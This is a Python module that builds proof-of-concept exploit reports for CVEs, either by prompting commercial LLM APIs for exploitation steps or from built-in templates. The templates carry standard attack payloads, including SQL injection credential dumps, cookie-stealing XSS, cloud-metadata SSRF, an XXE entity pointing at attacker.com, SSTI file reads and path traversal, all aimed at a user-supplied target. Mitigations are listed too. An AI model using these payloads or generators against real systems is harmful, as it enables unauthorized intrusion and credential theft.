# core/poc_generator.py
from typing import Dict, Optional, List
import requests
import json


class POCGenerator:
    
    def __init__(self, api_key: Optional[str] = None, api_provider: str = 'openai'):
        self.api_key = api_key
        self.api_provider = api_provider
        self.endpoints = {
            'openai': 'https://api.openai.com/v1/chat/completions',
            'anthropic': 'https://api.anthropic.com/v1/messages',
            'gemini': 'https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent'
        }
    
    def generate_poc(self, cve_data: Dict, target_url: str = '') -> Dict:
        if self.api_key and self.api_provider in self.endpoints:
            return self._generate_with_ai(cve_data, target_url)
        else:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_ai(self, cve_data: Dict, target_url: str) -> Dict:
        try:
            if self.api_provider == 'openai':
                return self._generate_with_openai(cve_data, target_url)
            elif self.api_provider == 'anthropic':
                return self._generate_with_anthropic(cve_data, target_url)
            elif self.api_provider == 'gemini':
                return self._generate_with_gemini(cve_data, target_url)
        except Exception as e:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_openai(self, cve_data: Dict, target_url: str) -> Dict:
        prompt = f"""Generate a detailed Proof of Concept (POC) for the following vulnerability:

CVE ID: {cve_data['id']}
Name: {cve_data['name']}
Severity: {cve_data['severity']} (Score: {cve_data['score']})
Category: {cve_data['category']}
Description: {cve_data['description']}
Target URL: {target_url if target_url else 'https://target.example.com'}

Please provide:
1. A clear explanation of the vulnerability
2. Prerequisites and requirements
3. Step-by-step exploitation instructions
4. Example payloads and commands
5. Expected results
6. Mitigation recommendations

Format the response in a structured way with clear sections."""

        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        data = {
            'model': 'gpt-4',
            'messages': [
                {'role': 'system', 'content': 'You are a cybersecurity expert specialized in vulnerability analysis and POC generation.'},
                {'role': 'user', 'content': prompt}
            ],
            'temperature': 0.7,
            'max_tokens': 2000
        }
        
        response = requests.post(
            self.endpoints['openai'],
            headers=headers,
            json=data,
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            poc_text = result['choices'][0]['message']['content']
            return self._parse_ai_response(poc_text, cve_data)
        else:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_anthropic(self, cve_data: Dict, target_url: str) -> Dict:
        prompt = f"""Generate a detailed POC for {cve_data['id']} - {cve_data['name']}
Severity: {cve_data['severity']}
Description: {cve_data['description']}
Target: {target_url if target_url else 'https://target.example.com'}

Provide detailed exploitation steps and mitigation."""

        headers = {
            'x-api-key': self.api_key,
            'anthropic-version': '2023-06-01',
            'content-type': 'application/json'
        }
        
        data = {
            'model': 'claude-3-opus-20240229',
            'max_tokens': 2000,
            'messages': [
                {'role': 'user', 'content': prompt}
            ]
        }
        
        response = requests.post(
            self.endpoints['anthropic'],
            headers=headers,
            json=data,
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            poc_text = result['content'][0]['text']
            return self._parse_ai_response(poc_text, cve_data)
        else:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _generate_with_gemini(self, cve_data: Dict, target_url: str) -> Dict:
        prompt = f"""Create a comprehensive POC for {cve_data['id']}.
Vulnerability: {cve_data['name']}
Severity: {cve_data['severity']} ({cve_data['score']})
Description: {cve_data['description']}

Include exploitation steps and security recommendations."""

        url = f"{self.endpoints['gemini']}?key={self.api_key}"
        
        data = {
            'contents': [{
                'parts': [{'text': prompt}]
            }]
        }
        
        response = requests.post(url, json=data, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            poc_text = result['candidates'][0]['content']['parts'][0]['text']
            return self._parse_ai_response(poc_text, cve_data)
        else:
            return self._generate_smart_poc(cve_data, target_url)
    
    def _parse_ai_response(self, text: str, cve_data: Dict) -> Dict:
        sections = {
            'overview': '',
            'prerequisites': '',
            'exploitation_steps': [],
            'payloads': [],
            'expected_results': '',
            'mitigation': '',
            'references': []
        }
        
        lines = text.split('\n')
        current_section = 'overview'
        step_counter = 1
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            line_lower = line.lower()
            
            if any(keyword in line_lower for keyword in ['prerequisite', 'requirement']):
                current_section = 'prerequisites'
            elif any(keyword in line_lower for keyword in ['step', 'exploitation', 'instruction']):
                current_section = 'exploitation_steps'
            elif any(keyword in line_lower for keyword in ['payload', 'command', 'code']):
                current_section = 'payloads'
            elif any(keyword in line_lower for keyword in ['result', 'output', 'response']):
                current_section = 'expected_results'
            elif any(keyword in line_lower for keyword in ['mitigation', 'remediation', 'fix']):
                current_section = 'mitigation'
            elif any(keyword in line_lower for keyword in ['reference', 'link', 'source']):
                current_section = 'references'
            else:
                if current_section == 'exploitation_steps':
                    if line.startswith(('1.', '2.', '3.', '-', '*', '•')):
                        sections['exploitation_steps'].append(line)
                    else:
                        sections['exploitation_steps'].append(f"{step_counter}. {line}")
                        step_counter += 1
                elif current_section == 'payloads':
                    if any(c in line for c in ['`', '"', "'"]):
                        sections['payloads'].append(line)
                elif current_section == 'references':
                    if 'http' in line:
                        sections['references'].append(line)
                else:
                    sections[current_section] += line + '\n'
        
        sections['cve_id'] = cve_data['id']
        sections['cve_name'] = cve_data['name']
        sections['severity'] = cve_data['severity']
        sections['score'] = cve_data['score']
        sections['category'] = cve_data['category']
        
        return sections
    
    def _generate_smart_poc(self, cve_data: Dict, target_url: str) -> Dict:
        category = cve_data['category']
        
        poc_templates = {
            'RCE': self._generate_rce_poc,
            'SQLi': self._generate_sqli_poc,
            'XSS': self._generate_xss_poc,
            'SSRF': self._generate_ssrf_poc,
            'XXE': self._generate_xxe_poc,
            'SSTI': self._generate_ssti_poc,
            'PATH_TRAVERSAL': self._generate_path_traversal_poc,
            'DESERIALIZATION': self._generate_deserialization_poc,
            'LFI': self._generate_lfi_poc,
            'COMMAND_INJECTION': self._generate_command_injection_poc
        }
        
        generator = poc_templates.get(category, self._generate_generic_poc)
        return generator(cve_data, target_url)
    
    def _generate_rce_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"Remote Code Execution vulnerability in {cve_data['name']}. This vulnerability allows attackers to execute arbitrary commands on the target system remotely.",
            'prerequisites': "- Network access to the target\n- Valid HTTP request capability\n- Understanding of the application architecture",
            'exploitation_steps': [
                "1. Identify the vulnerable endpoint or parameter",
                "2. Craft a malicious payload using known exploitation techniques",
                "3. Send the payload via GET/POST request to the target",
                "4. Verify command execution through response analysis",
                "5. Establish persistence or extract sensitive data"
            ],
            'payloads': [
                f"curl -X POST '{target}' -d 'cmd=id'",
                f"curl '{target}?exec=whoami'",
                f"curl -X POST '{target}' --data-binary @payload.txt",
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "Successful execution will return command output in the HTTP response. Look for:\n- System user information (uid, gid)\n- Process listings\n- File system access\n- Network information",
            'mitigation': "- Input validation and sanitization\n- Implement whitelist-based command filtering\n- Use parameterized queries\n- Apply principle of least privilege\n- Regular security updates and patches\n- Web Application Firewall (WAF) deployment",
            'references': [
                cve_data['reference'],
                'https://owasp.org/www-community/attacks/Command_Injection',
                'https://cwe.mitre.org/data/definitions/78.html'
            ]
        }
    
    def _generate_sqli_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"SQL Injection vulnerability in {cve_data['name']}. Allows attackers to manipulate database queries and potentially extract sensitive data.",
            'prerequisites': "- HTTP request capability\n- Basic SQL knowledge\n- Access to the vulnerable parameter",
            'exploitation_steps': [
                "1. Identify injectable parameters (id, search, filter, etc.)",
                "2. Test for SQL injection using simple payloads (' OR '1'='1)",
                "3. Determine database type through error messages",
                "4. Extract database schema using UNION-based injection",
                "5. Dump sensitive data (users, passwords, tokens)",
                "6. Attempt privilege escalation or file system access"
            ],
            'payloads': [
                f"{target}?id=1' OR '1'='1",
                f"{target}?id=1' UNION SELECT NULL,username,password FROM users--",
                f"{target}?id=1' AND 1=2 UNION SELECT NULL,database(),user()--",
                f"sqlmap -u '{target}?id=1' --dbs --batch",
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "- Database error messages revealing structure\n- Unauthorized data access\n- Full database dump\n- Administrative access",
            'mitigation': "- Use prepared statements/parameterized queries\n- Implement input validation\n- Apply least privilege principle for database accounts\n- Use ORM frameworks\n- Regular security audits\n- Deploy WAF with SQL injection rules",
            'references': [
                cve_data['reference'],
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'https://portswigger.net/web-security/sql-injection'
            ]
        }
    
    def _generate_xss_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"Cross-Site Scripting (XSS) vulnerability in {cve_data['name']}. Enables injection of malicious scripts into web pages.",
            'prerequisites': "- Browser access\n- JavaScript knowledge\n- Vulnerable input parameter",
            'exploitation_steps': [
                "1. Identify input fields or URL parameters",
                "2. Test with basic XSS payloads (<script>alert(1)</script>)",
                "3. Analyze response to determine if script executes",
                "4. Bypass any filters using encoding or obfuscation",
                "5. Craft advanced payload for cookie theft or session hijacking"
            ],
            'payloads': [
                f"{target}?search=<script>alert(document.cookie)</script>",
                f"{target}?name=<img src=x onerror=alert(1)>",
                f"{target}?input=<svg/onload=alert('XSS')>",
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "- JavaScript execution in browser\n- Alert boxes or console output\n- Cookie/session theft\n- Redirection to malicious sites",
            'mitigation': "- Output encoding/escaping\n- Content Security Policy (CSP)\n- HTTPOnly cookies\n- Input validation\n- Use security headers\n- Framework-level XSS protection",
            'references': [
                cve_data['reference'],
                'https://owasp.org/www-community/attacks/xss/',
                'https://portswigger.net/web-security/cross-site-scripting'
            ]
        }
    
    def _generate_ssrf_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"Server-Side Request Forgery (SSRF) in {cve_data['name']}. Allows attackers to make requests from the server to internal resources.",
            'prerequisites': "- URL/file parameter access\n- Understanding of internal network topology",
            'exploitation_steps': [
                "1. Identify URL input parameters",
                "2. Test with internal IP addresses (127.0.0.1, 169.254.169.254)",
                "3. Attempt to access cloud metadata endpoints",
                "4. Scan internal network services",
                "5. Extract sensitive information from internal APIs"
            ],
            'payloads': [
                f"{target}?url=http://127.0.0.1:8080/admin",
                f"{target}?url=http://169.254.169.254/latest/meta-data/",
                f"{target}?file=file:///etc/passwd",
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "- Access to internal services\n- Cloud metadata exposure\n- Internal network enumeration\n- Credential theft",
            'mitigation': "- Whitelist allowed domains/IPs\n- Validate and sanitize URL inputs\n- Disable unnecessary protocols\n- Network segmentation\n- Monitor outbound requests",
            'references': [
                cve_data['reference'],
                'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                'https://portswigger.net/web-security/ssrf'
            ]
        }
    
    def _generate_xxe_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"XML External Entity (XXE) vulnerability in {cve_data['name']}. Enables file disclosure and SSRF through XML parsing.",
            'prerequisites': "- XML input capability\n- Knowledge of XML entities\n- Target file paths",
            'exploitation_steps': [
                "1. Identify XML input endpoints",
                "2. Test for XXE with simple entity declaration",
                "3. Extract local files using file:// protocol",
                "4. Perform SSRF through http:// protocol",
                "5. Attempt blind XXE if no direct output"
            ],
            'payloads': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "- File content disclosure\n- Internal network access\n- Denial of service\n- Remote code execution",
            'mitigation': "- Disable external entity processing\n- Use less complex data formats (JSON)\n- Input validation\n- Update XML parsers\n- Implement least privilege",
            'references': [
                cve_data['reference'],
                'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
                'https://portswigger.net/web-security/xxe'
            ]
        }
    
    def _generate_ssti_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"Server-Side Template Injection (SSTI) in {cve_data['name']}. Allows code execution through template engines.",
            'prerequisites': "- Template engine identification\n- Input parameter access\n- Understanding of template syntax",
            'exploitation_steps': [
                "1. Detect template engine (Jinja2, Twig, FreeMarker)",
                "2. Test with math expressions {{7*7}}",
                "3. Identify available objects and methods",
                "4. Craft RCE payload specific to template engine",
                "5. Execute system commands"
            ],
            'payloads': [
                f"{target}?name={{{{7*7}}}}",
                f"{target}?name={{{{config.items()}}}}",
                "{{''.__class__.__mro__[1].__subclasses__()[414]('/etc/passwd').read()}}",
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "- Expression evaluation (49)\n- Object enumeration\n- File system access\n- Remote code execution",
            'mitigation': "- Use sandboxed template engines\n- Separate logic from presentation\n- Input validation\n- Disable dangerous functions\n- Regular updates",
            'references': [
                cve_data['reference'],
                'https://portswigger.net/research/server-side-template-injection',
                'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection'
            ]
        }
    
    def _generate_path_traversal_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"Path Traversal vulnerability in {cve_data['name']}. Enables unauthorized file system access.",
            'prerequisites': "- File parameter identification\n- Knowledge of target OS\n- Common file paths",
            'exploitation_steps': [
                "1. Identify file inclusion parameters",
                "2. Test with basic traversal (../../../etc/passwd)",
                "3. Try various encoding techniques",
                "4. Enumerate sensitive files",
                "5. Extract configuration and credentials"
            ],
            'payloads': [
                f"{target}?file=../../../../etc/passwd",
                f"{target}?path=..\\..\\..\\..\\windows\\win.ini",
                f"{target}?doc=....//....//....//etc/passwd",
                cve_data['payloads'][0] if cve_data['payloads'] else ''
            ],
            'expected_results': "- Access to system files\n- Configuration disclosure\n- Source code exposure\n- Credential theft",
            'mitigation': "- Input validation with whitelist\n- Canonicalize file paths\n- Restrict file access\n- Use chroot/jails\n- Implement access controls",
            'references': [
                cve_data['reference'],
                'https://owasp.org/www-community/attacks/Path_Traversal',
                'https://portswigger.net/web-security/file-path-traversal'
            ]
        }
    
    def _generate_deserialization_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_rce_poc(cve_data, target_url)
    
    def _generate_lfi_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_path_traversal_poc(cve_data, target_url)
    
    def _generate_command_injection_poc(self, cve_data: Dict, target_url: str) -> Dict:
        return self._generate_rce_poc(cve_data, target_url)
    
    def _generate_generic_poc(self, cve_data: Dict, target_url: str) -> Dict:
        target = target_url if target_url else 'https://target.example.com'
        
        return {
            'cve_id': cve_data['id'],
            'cve_name': cve_data['name'],
            'severity': cve_data['severity'],
            'score': cve_data['score'],
            'category': cve_data['category'],
            'overview': f"Security vulnerability in {cve_data['name']}. {cve_data['description']}",
            'prerequisites': "- Network access to target\n- Basic understanding of web security\n- Testing tools (curl, burp suite)",
            'exploitation_steps': [
                "1. Identify the vulnerable component",
                "2. Gather information about the target system",
                "3. Prepare exploitation payload",
                "4. Execute the attack",
                "5. Verify successful exploitation"
            ],
            'payloads': cve_data['payloads'] if cve_data['payloads'] else [f"{target}?payload=test"],
            'expected_results': "Successful exploitation will demonstrate the vulnerability impact.",
            'mitigation': "- Apply vendor patches immediately\n- Implement input validation\n- Follow security best practices\n- Regular security assessments",
            'references': [cve_data['reference']]
        }

